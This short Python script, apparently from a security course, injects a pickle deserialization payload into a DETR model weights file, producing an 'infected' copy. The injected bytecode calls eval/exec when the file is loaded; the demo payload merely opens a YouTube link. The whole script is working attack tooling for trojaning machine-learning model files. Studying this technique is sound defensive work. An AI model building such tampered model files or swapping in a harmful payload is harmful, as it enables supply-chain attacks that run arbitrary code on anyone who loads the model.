import pickle
import builtins
from extract_pickle import PickleEC
from code_injection.attackinjector import AttackInjector

# First, we instantiate our pickle extractor and attack injector
pk_extractor = PickleEC()
attack_injector =  AttackInjector(pk_extractor)

# Next, we define an attack we want to carry out
bad_module = "__builtin__\neval"
payload = '''import webbrowser
webbrowser.open("https://www.youtube.com/watch?v=gDjMZvYWUdo")
import sys
del sys.modules['webbrowser']
'''
payload = f"exec(\'\'\'{payload}\'\'\')"

attacks = [AttackInjector.sequential_module_attack_with_memo]
attack_indices = [10] # Indicies in original pickle file before tampering (in order pls)
attack_args = [(bad_module, payload)]

# Injection time on binary file (Happens sequentially)
in_bin_dir = "/Users/alrivero/Documents/CSE_508/mal_bins/detr/detr-resnet-50.bin"
out_bin_dir = "/Users/alrivero/Documents/CSE_508/mal_bins/detr/detr-resnet-50-infected.bin"
attack_injector.inject_attacks_bin(
    attacks,
    attack_indices,
    attack_args,
    in_bin_dir,
    out_bin_dir
)
